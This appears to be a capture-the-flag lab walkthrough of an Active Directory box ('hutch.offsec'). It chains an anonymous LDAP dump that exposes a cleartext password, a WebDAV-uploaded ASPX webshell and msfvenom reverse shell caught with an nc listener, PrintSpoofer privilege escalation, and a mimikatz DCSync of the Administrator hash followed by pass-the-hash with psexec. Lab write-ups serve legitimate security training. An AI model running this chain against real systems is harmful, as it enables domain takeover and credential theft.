

Using ldap anonymous access, we were able to extract all object information on the domain.

Part of the results revealed that there was an user called `Freddy McSorley` who's credential was in cleartext in the `description` field. 


Command: `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.209.122" "(objectclass=*)" > ldap.results`

Results:
```
# Freddy McSorley, Users, hutch.offsec

dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec

objectClass: top

objectClass: person

objectClass: organizationalPerson

objectClass: user

cn: Freddy McSorley

description: Password set to CrabSharkJellyfish192 at user's request. Please c

 hange on next login.

distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec

instanceType: 4
. . .
userPrincipalName: fmcsorley@hutch.offsec
```

Creds:

**fmcsorley:CrabSharkJellyfish192**

--- 

#### Initial Access - WebDav Client

I used `cadaver` to access the webdav server on the target using fmcsorley credentials. 
1. Upload a aspx webshell using `put cmdasp.aspx` which can be found in `/usr/share/webshell/aspx`. After that, I uploaded a msfvenom reverse shell `put shell.exe` and used cmdasp.aspx to trigger the shell which is uploaded to `c:\inetpub\wwwroot\shell.exe`.
![[Pasted image 20231101215932.png]]

`nc -lvnp 443`

![[Pasted image 20231101215949.png]]

#### Privilege Escalation - SeImpersonatePrivilege + DCSync

I downloaded sharpup and ran it. It showed that the iis apppool account had `SeImpersonatePrivilege`. 
![[Pasted image 20231101223014.png]]

I also checked if the Printer Spooler service was running using `get-service -name spooler` and I found that the spooler service was indeed running:

![[Pasted image 20231101223112.png]]

This combination of factors makes this machine vulnerable to the famous printspoofer exploit.

After running the exploit, I noticed that printspoofer exploit gave me access to the DC machine account hutchdc$. The machine account for the DC itself always have DCSync privilege.

![[Pasted image 20231101222808.png]]

![[Pasted image 20231101222756.png]]

Knowing this, I downloaded mimikatz into the system and DCSync the Administrator account.

`mimikatz # lsadump::dcsync /domain:hutch.offsec /user:Administrator`

```
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 11/1/2023 4:29:23 PM
Object Security ID   : S-1-5-21-2216925765-458455009-2806096489-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 47b6dbd3ab1474e560406edb7ad53a4a

```

Then, I connected to the DC using psexec and the administrator user passing the hash and got access in the DC as SYSTEM!

![[Pasted image 20231101222451.png]]
